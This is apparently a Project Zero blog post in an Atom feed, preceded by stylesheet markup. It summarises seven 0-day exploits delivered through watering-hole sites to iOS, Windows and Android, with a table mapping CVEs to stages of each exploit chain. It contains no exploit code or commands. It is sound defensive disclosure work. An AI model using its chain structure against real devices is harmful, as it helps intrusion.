"}ul.lst-kix_a41x0ya2xyd3-3{list-style-type:none}ul.lst-kix_a41x0ya2xyd3-2{list-style-type:none}ul.lst-kix_a41x0ya2xyd3-1{list-style-type:none}ul.lst-kix_a41x0ya2xyd3-0{list-style-type:none}.lst-kix_wl1qmy9tv69d-5&gt;li:before{content:"\0025a0  "}.lst-kix_wl1qmy9tv69d-6&gt;li:before{content:"\0025cf  "}.lst-kix_wl1qmy9tv69d-3&gt;li:before{content:"\0025cf  "}.lst-kix_wl1qmy9tv69d-0&gt;li:before{content:"\0025cf  "}.lst-kix_wl1qmy9tv69d-4&gt;li:before{content:"\0025cb  "}.lst-kix_40ztqamj21pm-8&gt;li:before{content:"\0025a0  "}.lst-kix_wl1qmy9tv69d-1&gt;li:before{content:"\0025cb  "}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_wl1qmy9tv69d-2&gt;li:before{content:"\0025a0  "}.lst-kix_40ztqamj21pm-3&gt;li:before{content:"\0025cf  "}.lst-kix_40ztqamj21pm-5&gt;li:before{content:"\0025a0  "}.lst-kix_40ztqamj21pm-4&gt;li:before{content:"\0025cb  "}.lst-kix_40ztqamj21pm-7&gt;li:before{content:"\0025cb  "}.lst-kix_40ztqamj21pm-6&gt;li:before{content:"\0025cf  "}ol{margin:0;padding:0}table td,table th{padding:0}.c11{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:104.2pt;border-top-color:#000000;border-bottom-style:solid}.c3{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:105.8pt;border-top-color:#000000;border-bottom-style:solid}.c15{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:62.2pt;border-top-color:#000000;border-bottom-style:solid}.c2{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:50.2pt;border-top-color:#000000;border-bottom-style:solid}.c12{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:84.8pt;border-top-color:#000000;border-bottom-style:solid}.c8{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:105pt;border-top-color:#000000;border-bottom-style:solid}.c18{-webkit-text-decoration-skip:none;color:#00796b;font-weight:400;text-decoration:line-through;vertical-align:baseline;text-decoration-skip-ink:none;font-size:11pt;font-family:"Arial";font-style:normal}.c6{margin-left:36pt;padding-top:0pt;padding-left:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c5{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.c20{padding-top:20pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c0{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c1{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:20pt;font-family:"Arial";font-style:normal}.c4{padding-top:0pt;padding-bottom:0pt;line-height:1.0;orphans:2;widows:2;text-align:left}.c9{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c16{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c23{border-spacing:0;border-collapse:collapse;margin-right:auto}.c10{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c22{font-family:Consolas,"Courier New";color:#0d904f;font-weight:400}.c7{padding:0;margin:0}.c13{color:inherit;text-decoration:inherit}.c21{height:11pt}.c14{height:0pt}.c19{margin-left:36pt}.c17{font-style:italic}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class="c10"&gt; &lt;p class="c9"&gt;&lt;span class="c0"&gt;Posted by Maddie Stone, Project Zero&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c9"&gt;&lt;span&gt;In October 2020, Google Project Zero discovered seven 0-day exploits being actively used in-the-wild. These exploits were delivered via &amp;quot;watering hole&amp;quot; attacks in a handful of websites pointing to two exploit servers that hosted exploit chains for Android, Windows, and iOS devices. These attacks appear to be the next iteration of the campaign discovered in February 2020 and documented in &lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c131" href="https://googleprojectzero.blogspot.com/2021/01/introducing-in-wild-series.html"&gt;this blog post series&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c9"&gt;&lt;span&gt;In this post we are summarizing the exploit chains we discovered in October 2020. We have already published the details of the seven 0-day vulnerabilities exploited in our &lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c131" href="https://googleprojectzero.github.io/0days-in-the-wild/rca.html"&gt;root cause analysis (RCA) posts&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;. This post aims to provide the context around these exploits.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c20" id="h.l4g80ih1elef"&gt;&lt;span&gt;What happened&lt;/span&gt;&lt;/h1&gt; &lt;p class="c9"&gt;&lt;span&gt;In October 2020, we discovered that the actor from the &lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c131" href="https://googleprojectzero.blogspot.com/2021/01/introducing-in-wild-series.html"&gt;February 2020 campaign&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;came back with the next iteration of their &lt;/span&gt;&lt;span&gt;campaign: a couple dozen websites&lt;/span&gt;&lt;span&gt;&amp;nbsp;redirecting to an exploit server.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Once our analysis began&lt;/span&gt;&lt;span&gt;, we discovered&lt;/span&gt;&lt;span&gt;&amp;nbsp;links to&lt;/span&gt;&lt;span&gt;&amp;nbsp;a &lt;/span&gt;&lt;span&gt;second exploit server on the same website.&lt;/span&gt;&lt;span&gt;&amp;nbsp;After initial fingerprinting (appearing to be based on the origin of the IP address and the user-agent), an iframe was injected into the website pointing to one of the two exploit servers.&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c9"&gt;&lt;span class="c0"&gt;In our testing, both of the exploit servers existed on all of the discovered domains. A summary of the two exploit servers is below:&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c9"&gt;&lt;span class="c0"&gt;Exploit server #1:&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c7 lst-kix_a41x0ya2xyd3-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c6 li-bullet-0"&gt;&lt;span class="c0"&gt;Initially responded to only iOS and Windows user-agents&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c6 li-bullet-0"&gt;&lt;span class="c0"&gt;Remained up and active for over a week from when we first started pulling exploits&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c6 li-bullet-0"&gt;&lt;span class="c0"&gt;Replaced the Chrome renderer RCE with a new v8 0-day (CVE-2020-16009) after the initial one (CVE-2020-15999) was patched&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c6 li-bullet-0"&gt;&lt;span class="c0"&gt;Briefly responded to Android user-agents after exploit server #2 went down (though we were only able to get the new Chrome renderer RCE)&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="c5"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c9"&gt;&lt;span class="c0"&gt;Exploit server #2:&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c7 lst-kix_e7a7d17rpo44-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c6 li-bullet-0"&gt;&lt;span class="c0"&gt;Responded to Android user-agents&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c6 li-bullet-0"&gt;&lt;span class="c0"&gt;Remained up and active for ~36 hours from when we first started pulling exploits&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c6 li-bullet-0"&gt;&lt;span&gt;In our experience, responded to a much smaller block of IP addresses &lt;/span&gt;&lt;span class="c0"&gt;than exploit server #1&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="c5"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c9"&gt;&lt;/p&gt; &lt;p class="c9"&gt;&lt;span class="c0"&gt;&lt;a href="https://1.bp.blogspot.com/-37hyk7hERGk/YFDuISGgCNI/AAAAAAAAaww/xcrVLfY_ZUQVozcte09NaqafWbL8ukvDgCNcBGAsYHQ/s1660/image1%2B%25282%2529.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://1.bp.blogspot.com/-37hyk7hERGk/YFDuISGgCNI/AAAAAAAAaww/xcrVLfY_ZUQVozcte09NaqafWbL8ukvDgCNcBGAsYHQ/s600/image1%2B%25282%2529.png" border="0" alt="" style="max-height: 750; max-width: 600;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c9"&gt;&lt;span class="c0"&gt;The diagram above shows the flow of a device connecting to one of the affected websites. The device is directed to either exploit server #1 or exploit server #2. The following exploits are then delivered based on the device and browser. &lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c18"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.3cafad71de9bdf802e641f664e9fc6cf05262457"&gt;&lt;/a&gt;&lt;a id="t.0"&gt;&lt;/a&gt;&lt;table class="c23"&gt;&lt;tbody&gt;&lt;tr class="c14"&gt;&lt;td class="c2" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;Exploit Server&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c3" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;Platform&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;Browser&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c8" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;Renderer RCE&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c12" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;Sandbox Escape&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c11" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;Local Privilege Escalation&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c14"&gt;&lt;td class="c2" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;1&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c3" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;iOS&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;Safari&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c8" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;Stack R/W via Type 1 Fonts (CVE-2020-27930)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c12" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;Not needed&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c11" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;Info leak via mach message trailers (CVE-2020-27950)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c21"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;Type confusion with turnstiles (CVE-2020-27932)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c14"&gt;&lt;td class="c2" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;1&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c3" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;Windows&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;Chrome&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c8" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;Freetype heap buffer overflow&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;(CVE-2020-15999)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c12" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;Not needed&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c11" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c22"&gt;cng.sys&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;heap buffer overflow (CVE-2020-17087)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c14"&gt;&lt;td class="c2" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;1&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c3" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;Android&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c21"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;** Note: This was only delivered after #2 went down and CVE-2020-15999 was patched.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;Chrome&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c8" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;V8 type confusion in TurboFan (CVE-2020-16009)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c12" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;Unknown&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c11" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;Unknown&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c14"&gt;&lt;td class="c2" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;2&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c3" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;Android&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;Chrome&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c8" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;Freetype heap buffer overflow&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;(CVE-2020-15999)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c12" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;Chrome for Android head buffer overflow (CVE-2020-16010)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c11" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;Unknown&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c14"&gt;&lt;td class="c2" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;2&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c3" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;Android&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;Samsung Browser&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c8" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;Freetype heap buffer overflow&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;(CVE-2020-15999)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c12" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;Chromium n-day&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c11" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;Unknown&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c5"&gt;&lt;span class="c18"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c9"&gt;&lt;span class="c0"&gt;All of the platforms employed obfuscation and anti-analysis checks, but each platform&amp;#39;s obfuscation was different. For example, iOS is the only platform whose exploits were encrypted with ephemeral keys, meaning that the exploits couldn&amp;#39;t be recovered from the packet dump alone, instead requiring an active MITM on our side to rewrite the exploit on-the-fly.&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c9"&gt;&lt;span&gt;These operational exploits also lead us to believe that while the entities between exploit servers #1 and #2 are different, they are likely working in a coordinated fashion. Both exploit servers used the Chrome Freetype RCE (CVE-2020-15999) as the renderer exploit for Windows (exploit server #1) and Android (exploit server #2), but the code that surrounded these exploits was quite different. The fact that the two servers went down at different times also lends us to believe that there were two distinct operators.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c20" id="h.fbv1digk4pqk"&gt;&lt;span class="c1"&gt;The exploits&lt;/span&gt;&lt;/h1&gt; &lt;p class="c9"&gt;&lt;span class="c0"&gt;In total, we collected:&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c7 lst-kix_kan00gftou8h-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c6 li-bullet-0"&gt;&lt;span class="c0"&gt;1 full chain targeting fully patched Windows 10 using Google Chrome&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c6 li-bullet-0"&gt;&lt;span&gt;2 partial &lt;/span&gt;&lt;span&gt;chains&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;targeting 2 different fully patched Android devices running Android 10 using Google Chrome and Samsung Browser, and&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c6 li-bullet-0"&gt;&lt;span&gt;RCE exploits for iOS 11-13 and privilege escalation exploit for iOS 13 (though the vulnerabilities were present up to iOS 14.1)&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="c5 c19"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c9"&gt;&lt;span class="c17"&gt;*Note: iOS, Android, and Windows &lt;/span&gt;&lt;span class="c17"&gt;were the only devices we tested while the servers were still active&lt;/span&gt;&lt;span class="c17"&gt;. The lack of other exploit chains does not mean that those chains did not exist.&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c9"&gt;&lt;span&gt;The seven 0-days exploited by this attacker are listed below. We&amp;rsquo;ve provided the technical details of each of the vulnerabilities and their exploits in the &lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c131" href="https://googleprojectzero.github.io/0days-in-the-wild/rca.html"&gt;root cause analyses&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c7 lst-kix_40ztqamj21pm-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c6 li-bullet-0"&gt;&lt;span class="c16"&gt;&lt;a class="c131" href="https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2020/CVE-2020-15999.html"&gt;CVE-2020-15999&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;- Chrome Freetype heap buffer overflow&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c6 li-bullet-0"&gt;&lt;span class="c16"&gt;&lt;a class="c131" href="https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2020/CVE-2020-17087.html"&gt;CVE-2020-17087&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;- Windows heap buffer overflow in cng.sys&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c6 li-bullet-0"&gt;&lt;span class="c16"&gt;&lt;a class="c131" href="https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2020/CVE-2020-16009.html"&gt;CVE-2020-16009&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;- Chrome type confusion in TurboFan map deprecation&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c6 li-bullet-0"&gt;&lt;span class="c16"&gt;&lt;a class="c131" href="https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2020/CVE-2020-16010.html"&gt;CVE-2020-16010&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;- Chrome for Android heap buffer overflow&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c6 li-bullet-0"&gt;&lt;span class="c16"&gt;&lt;a class="c131" href="https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2020/CVE-2020-27930.html"&gt;CVE-2020-27930&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;- Safari arbitrary stack read/write via Type 1 fonts&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c6 li-bullet-0"&gt;&lt;span class="c16"&gt;&lt;a class="c131" href="https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2020/CVE-2020-27950.html"&gt;CVE-2020-27950&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;- iOS XNU kernel memory disclosure in mach message trailers&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c6 li-bullet-0"&gt;&lt;span class="c16"&gt;&lt;a class="c131" href="https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2020/CVE-2020-27932.html"&gt;CVE-2020-27932&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;- iOS kernel type confusion with turnstiles&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="c5"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c9"&gt;&lt;span&gt;We were not able to collect any Android local privilege escalations prior to exploit server #2 being taken down.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;E&lt;/span&gt;&lt;span&gt;xploit server #1 stay&lt;/span&gt;&lt;span&gt;ed&lt;/span&gt;&lt;span&gt;&amp;nbsp;up longer, and we were able to retrieve the privilege escalation exploits for iOS. &lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c9"&gt;&lt;span class="c0"&gt;The vulnerabilities cover a fairly broad spectrum of issues - from a modern JIT vulnerability to a large cache of font bugs. Overall each of the exploits themselves showed an expert understanding of exploit development and the vulnerability being exploited. In the case of the Chrome Freetype 0-day, the exploitation method was novel to Project Zero. The process to figure out how to trigger the iOS kernel privilege vulnerability would have been non-trivial. The obfuscation methods were varied and time-consuming to figure out. &lt;/span&gt;&lt;/p&gt;&lt;h1 class="c20" id="h.h3w9z6ffx286"&gt;&lt;span class="c1"&gt;Conclusion&lt;/span&gt;&lt;/h1&gt; &lt;p class="c9"&gt;&lt;span&gt;Project Zero closed out 2020 with lots of long days analyzing lots of 0-day exploit chains and seven 0-day exploits. &lt;/span&gt;&lt;span&gt;When combined with &lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c131" href="https://googleprojectzero.blogspot.com/2021/01/introducing-in-wild-series.html"&gt;their earlier 2020 operation&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, the actor used at least 11 0-days in less than a year. &lt;/span&gt;&lt;span&gt;We are so thankful to all of the vendors and defensive response teams who worked their own long days to analyze our reports and get patches released and applied. &lt;/span&gt;&lt;/p&gt;</content>
    <link rel="replies" type="application/atom+xml" href="https://googleprojectzero.blogspot.com/feeds/1665805603751590479/comments/default" title="Post Comments" />
    <link rel="replies" type="text/html" href="https://googleprojectzero.blogspot.com/2021/03/in-wild-series-october-2020-0-day.html#comment-form" title="0 Comments" />
    <link rel="edit" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/1665805603751590479" />
    <link rel="self" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/1665805603751590479" />
    <link rel="alternate" type="text/html" href="https://googleprojectzero.blogspot.com/2021/03/in-wild-series-october-2020-0-day.html" title="In-the-Wild Series: October 2020 0-day discovery" />
    <author>
      <name>Ryan</name>
      <uri>http://www.blogger.com/profile/17011901605865574886</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif" />
    </author>
    <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://1.bp.blogspot.com/-37hyk7hERGk/YFDuISGgCNI/AAAAAAAAaww/xcrVLfY_ZUQVozcte09NaqafWbL8ukvDgCNcBGAsYHQ/s72-c/image1%2B%25282%2529.png" height="72" width="72" />
    <thr:total>0</thr:total>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-4838136820032157985.post-2386590713508572091</id>
    <published>2021-02-03T09:10:00.006-08:00</published>
    <updated>2021-02-04T10:23:09.489-08:00</updated>
